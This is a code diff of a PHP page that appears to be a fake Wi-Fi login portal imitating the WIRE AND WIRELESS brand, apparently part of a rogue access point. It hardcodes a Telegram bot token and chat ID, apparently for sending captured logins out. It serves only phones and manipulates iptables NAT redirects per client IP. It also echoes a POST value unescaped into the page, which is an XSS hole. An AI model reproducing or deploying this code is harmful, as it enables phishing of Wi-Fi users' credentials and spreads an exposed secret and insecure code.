@@ -1,13 +1,14 @@
 <?php
-set_time_limit(300);
+set_time_limit(60);
+
+$token = '834034144:AAHVj2gRGsj2IegHSgVZsjJ0rrOHmE3ZmWI';
+$chat = '-349544685';
 
 if (strpos($_SERVER['HTTP_USER_AGENT'],'iPhone') === false && strpos($_SERVER['HTTP_USER_AGENT'],'Android') === false) {
 	header("HTTP/1.0 418 I'm a teapot");
 	exit();
 }
 
-$token = '834034144:AAHVj2gRGsj2IegHSgVZsjJ0rrOHmE3ZmWI';
-$chat = '-349544685';
 
 if (isset($_POST['cou'])) {
 	if ($_POST['mail'] == 'a@b' && $_POST['pass'] == 'c') {
@@ -31,8 +32,8 @@ if (isset($_POST['cou'])) {
 	} else {
 		system('sudo iptables -t nat -D PREROUTING `sudo iptables -t nat -L --line-numbers '
 			. '| grep "' . $_SERVER['REMOTE_ADDR'] . '" | grep ":80" | awk \'{print $1}\'`');
-		system('sudo iptables -t nat -D PREROUTING `sudo iptables -t nat -L --line-numbers '
-			. '| grep "' . $_SERVER['REMOTE_ADDR'] . '" | grep ":443" | awk \'{print $1}\'`');
+		//system('sudo iptables -t nat -D PREROUTING `sudo iptables -t nat -L --line-numbers '
+		//	. '| grep "' . $_SERVER['REMOTE_ADDR'] . '" | grep ":443" | awk \'{print $1}\'`');
 
 		//header('HTTP/1.0 204 No Content');
 		echo '.';
@@ -312,7 +313,7 @@ Copyright © WIRE AND WIRELESS All rights reserved.
 		<br />
 		<br />
 		<input type="hidden" id="cou" name="cou" value="<?=$_POST['cou']?>" />
-		<input type="button" id="button" onclick="location.href='./regist1.php'" value="新規登録" style="width:55%;margin:0 auto 0 auto;padding:10px;" />
+		<input type="button" id="button" onclick="location.href='./regist1.php'" value="1分登録" style="width:55%;margin:0 auto 0 auto;padding:10px;" />
 	</form>
 </body>
 </html>
